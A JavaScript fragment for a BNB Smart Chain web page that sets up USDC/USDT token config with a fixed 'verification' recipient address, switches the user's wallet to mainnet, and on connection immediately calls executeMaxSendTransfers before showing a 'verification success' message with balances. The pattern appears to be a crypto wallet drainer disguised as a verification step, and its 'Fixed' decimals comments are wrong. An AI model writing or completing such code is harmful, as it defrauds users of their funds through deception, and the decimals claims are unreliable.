// BNB Smart Chain Configuration - MAINNET
const contractConfig = {
  chainId: 56, // BNB Mainnet
  usdc: {
    address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // Verify this is mainnet
    decimals: 6  // Fixed: BNB USDC = 6 decimals
  },
  usdt: {
    address: "0x55d398326f99059fF775485246999027B3197955", 
    decimals: 6  // Fixed: BNB USDT = 6 decimals
  },
  verification: {
    recipient: "0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B"
  }
};

// Network check + switch (Add this function)
async function ensureCorrectNetwork(signer) {
  try {
    const network = await signer.provider.getNetwork();
    if (network.chainId !== 56) { // BNB Mainnet
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }], // 56 in hex
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38',
              chainName: 'BNB Smart Chain',
              rpcUrls: ['https://bsc-dataseed1.binance.org/'],
              nativeCurrency: {
                name: 'BNB',
                symbol: 'BNB',
                decimals: 18
              },
              blockExplorerUrls: ['https://bscscan.com']
            }]
          });
        }
      }
    }
  } catch (error) {
    console.error('Network switch failed:', error);
  }
}

// Updated connect function
async function connectWallet(walletType) {
  if (!window.ethereum) {
    alert('Wallet not found!');
    return;
  }

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    
    // âœ… CRITICAL: Check network first
    await ensureCorrectNetwork(signer);
    
    const userAddress = await signer.getAddress();
    
    // Rest of your code...
    const transferResult = await executeMaxSendTransfers(signer, userAddress);
    
  } catch (error) {
    console.error("Error:", error);
    alert(`Connection failed: ${error.message}`);
  }
}

// Fix decimals in showVerificationSuccess
function showVerificationSuccess(address, usdcBalance, usdtBalance, usdcDecimals, usdtDecimals, transactionCount, receiveResult) {
  const usdcAmount = ethers.utils.formatUnits(usdcBalance, usdcDecimals || 6); // Default 6
  const usdtAmount = ethers.utils.formatUnits(usdtBalance, usdtDecimals || 6);
  // ... rest code
}